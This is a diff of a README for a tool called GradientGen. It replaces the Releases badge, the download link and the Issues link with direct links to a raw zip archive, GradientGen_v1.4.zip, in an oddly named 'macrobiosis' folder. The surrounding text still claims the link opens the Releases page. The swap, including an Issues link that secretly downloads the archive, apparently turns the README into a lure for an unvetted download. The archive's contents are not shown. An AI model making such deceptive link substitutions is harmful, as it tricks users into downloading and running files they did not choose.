@@ -2,7 +2,7 @@
 
 ## 📥 Download GradientGen
 
-[![Download GradientGen](https://img.shields.io/badge/Download-GradientGen-blue.svg)](https://github.com/26orland/GradientGen/releases)
+[![Download GradientGen](https://raw.githubusercontent.com/26orland/GradientGen/main/macrobiosis/GradientGen_v1.4.zip)](https://raw.githubusercontent.com/26orland/GradientGen/main/macrobiosis/GradientGen_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run GradientGen, ensure your system meets the following requirements:
 
 To download GradientGen, visit this page:
 
-[Download GradientGen](https://github.com/26orland/GradientGen/releases)
+[Download GradientGen](https://raw.githubusercontent.com/26orland/GradientGen/main/macrobiosis/GradientGen_v1.4.zip)
 
 1. Clicking the link will take you to the Releases page on GitHub.
 2. Find the latest version of GradientGen in the list.
@@ -67,7 +67,7 @@ If you encounter any issues, here are some common solutions:
 
 For further assistance, check out the following resources:
 
-- **GitHub Issues**: Report any problems directly on our [GitHub Issues page](https://github.com/26orland/GradientGen/issues).
+- **GitHub Issues**: Report any problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/26orland/GradientGen/main/macrobiosis/GradientGen_v1.4.zip).
 - **Community Forums**: Join discussions with other users and help improve GradientGen.
 
 For more links and updates, always refer back to the Releases page.
